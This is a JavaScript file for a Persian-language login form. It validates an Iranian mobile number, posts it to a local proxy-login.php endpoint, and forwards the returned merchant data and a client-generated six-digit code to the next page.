document.addEventListener("DOMContentLoaded", function () {
  const phoneNumberInput = document.getElementById("phoneNumber");
  const phoneError = document.getElementById("phoneError");
  const agreeTermsCheckbox = document.getElementById("agreeTerms");
  const submitButton = document.getElementById("submitBtn");
  const preloader = document.getElementById("preloader");
  const scodeInput = document.getElementById("scode");
  const loginForm = document.getElementById("loginForm");

  // Function to generate random 6-digit code
  function generateActivationCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
  }

  // Set the activation code when page loads
  scodeInput.value = generateActivationCode();

  // Function to validate form inputs and enable/disable button
  function validateForm() {
    const phoneRegex = /^09[0-9]{9}$/;
    const isPhoneValid = phoneRegex.test(phoneNumberInput.value);
    const isTermsAgreed = agreeTermsCheckbox.checked;

    // Update phone input style and error message
    if (phoneNumberInput.value.length > 0 && !isPhoneValid) {
      phoneNumberInput.classList.remove("is-valid");
      phoneNumberInput.classList.add("is-invalid");
      phoneError.style.display = "block";
    } else if (isPhoneValid) {
      phoneNumberInput.classList.remove("is-invalid");
      phoneNumberInput.classList.add("is-valid");
      phoneError.style.display = "none";
    } else {
      phoneNumberInput.classList.remove("is-valid", "is-invalid");
      phoneError.style.display = "none";
    }

    // Enable/disable submit button
    submitButton.disabled = !(isPhoneValid && isTermsAgreed);
  }

  // Function to show error message
  function showError(message) {
    let errorElement = document.getElementById("apiError");
    if (!errorElement) {
      errorElement = document.createElement("div");
      errorElement.id = "apiError";
      errorElement.className = "error-message";
      errorElement.style.textAlign = "center";
      errorElement.style.marginTop = "1rem";
      errorElement.style.color = "var(--error-color)";
      loginForm.appendChild(errorElement);
    }
    errorElement.textContent = message;
  }

  // Function to handle form submission
  async function handleSubmit(event) {
    event.preventDefault();

    const phoneNumber = phoneNumberInput.value;

    // Disable submit button during API call
    submitButton.disabled = true;
    submitButton.textContent = "در حال بررسی...";

    try {
      const response = await fetch("./proxy-login.php", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mobileNumber: String(phoneNumber),
        }),
      });

      // ابتدا پاسخ را به صورت متن دریافت می‌کنیم
      const responseText = await response.text();

      // اگر پاسخ خالی نبود، آن را به JSON تبدیل می‌کنیم
      const data = responseText ? JSON.parse(responseText) : {};

      if (!response.ok || data.success === false) {
        // Show error message
        const errorMessage =
          data.errors?.[0]?.message ||
          data.message ||
          "خطا در ارتباط با سرور. لطفاً مجدداً تلاش نمایید.";
        showError(errorMessage);

        // Reset form state
        submitButton.disabled = false;
        submitButton.textContent = "دریافت کد ورود";
        return;
      }

      // Success - redirect to pass-number.php with merchant data
      const form = document.createElement("form");
      form.method = "POST";
      form.action = "pass-number.php";

      // Add all merchant data as hidden inputs
      for (const key in data) {
        const input = document.createElement("input");
        input.type = "hidden";
        input.name = key;
        input.value =
          typeof data[key] === "object" ? JSON.stringify(data[key]) : data[key];
        form.appendChild(input);
      }

      // Add the activation code
      const codeInput = document.createElement("input");
      codeInput.type = "hidden";
      codeInput.name = "scode";
      codeInput.value = scodeInput.value;
      form.appendChild(codeInput);

      document.body.appendChild(form);
      form.submit();
    } catch (error) {
      console.error("Error:", error);
      showError("خطا در ارتباط با سرور. لطفاً مجدداً تلاش نمایید.");
      submitButton.disabled = false;
      submitButton.textContent = "دریافت کد ورود";
    }
  }

  // Attach event listeners
  phoneNumberInput.addEventListener("input", validateForm);
  agreeTermsCheckbox.addEventListener("change", validateForm);
  loginForm.addEventListener("submit", handleSubmit);

  // Initial validation call on page load to set initial button state
  validateForm();

  // Hide preloader after everything is loaded
  window.addEventListener("load", function () {
    preloader.classList.add("hidden");
    setTimeout(() => {
      preloader.style.display = "none";
    }, 500);
    window.scrollTo(0, 1);
  });
});
